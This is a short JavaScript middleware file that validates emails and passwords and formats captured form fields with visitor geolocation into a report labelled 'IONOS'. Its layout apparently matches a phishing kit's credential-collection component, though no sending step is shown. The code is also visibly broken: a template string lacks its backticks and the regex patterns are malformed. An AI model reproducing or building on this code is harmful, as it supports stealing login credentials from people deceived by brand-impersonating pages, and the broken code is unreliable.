// middleware/receive.js

function validateEmail(email) { return /^[^@\s]+@[^@\s]+.[^@\s]+$/.test(email); }

function validatePassword(password) { return /^(?=.[a-z])(?=.[A-Z])(?=.\d)(?=.[\W_]).{8,}$/.test(password); }

function prepareMessage(header, type, includeFullGeo, data, geoInfo, basicGeoInfo) { let message = 👤 ${header}\n\n========================\n\n;

Object.entries(data).forEach(([key, value]) => {
    if (value && key.toLowerCase() !== "click") {
        message += `${key.toUpperCase()}: ${value}\n`;
    }
});

message += `\n========================\n\n${includeFullGeo ? geoInfo : basicGeoInfo}========================\n\n✅ IONOS\n`;
return { url: type, message };

}

module.exports = { validateEmail, validatePassword, prepareMessage };



